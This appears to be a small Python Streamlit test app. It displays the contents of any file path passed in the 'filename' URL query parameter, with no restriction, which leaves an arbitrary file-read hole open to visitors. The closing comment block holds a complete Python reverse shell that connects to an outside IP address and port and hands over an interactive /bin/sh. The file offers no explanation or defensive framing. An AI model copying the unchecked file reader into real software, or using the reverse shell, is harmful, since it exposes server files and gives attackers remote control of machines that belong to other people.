import os
import streamlit as st

st.title("🎈 My Teste App - Streamlit")
if len(st.query_params)>0:
    filename = st.query_params.filename
    if(os.path.isfile(filename)):
        try:
            filec = open(filename).read()
            rdata = filec
        except Exception as e:
            rdata = e
    else:
        rdata = "File not found !"
    
    st.write(
        f"Content of file: {filename}"
    )
    st.write(
        f"{rdata}"
    )

# import socket,subprocess,os
# s=socket.socket(socket.AF_INET,socket.SOCK_STREAM)
# s.connect(("54.207.37.3",12418));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call(["/bin/sh","-i"]);